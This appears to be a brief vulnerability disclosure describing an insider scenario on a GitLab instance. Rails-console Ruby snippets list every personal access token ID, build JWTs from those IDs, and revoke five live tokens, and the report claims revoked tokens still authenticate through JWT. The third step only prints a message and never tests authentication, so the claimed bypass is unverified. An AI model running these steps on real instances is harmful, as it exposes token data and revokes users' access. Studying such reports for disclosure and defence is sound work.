# Insider Attack Scenario

## Background
An attacker has gained access to a GitLab instance through:
- Compromised admin account
- Database access
- Log file access
- Internal network access

## Attack Steps

### Step 1: Extract Token IDs
```ruby
# Rails console access (insider threat)
tokens = PersonalAccessToken.all
token_ids = tokens.pluck(:id)
puts "Found #{token_ids.length} token IDs: #{token_ids.join(', ')}"
```

### Step 2: Create JWT Tokens
```ruby
# Create JWT tokens for each token ID
token_ids.each do |token_id|
  jwt_token = Gitlab::JWTToken.new
  jwt_token['token'] = token_id
  puts "JWT for token #{token_id}: #{jwt_token.encoded}"
end
```

### Step 3: Test Revoked Tokens
```ruby
# Revoke some tokens
tokens_to_revoke = PersonalAccessToken.limit(5)
tokens_to_revoke.each(&:revoke!)

# Test JWT authentication with revoked tokens
tokens_to_revoke.each do |token|
  jwt_token = Gitlab::JWTToken.new
  jwt_token['token'] = token.id
  
  # This should work despite token being revoked (VULNERABILITY)
  puts "Testing revoked token #{token.id} with JWT..."
end
```

## Impact
- Attacker can maintain access to revoked tokens
- Bypass token lifecycle management
- Access sensitive data and operations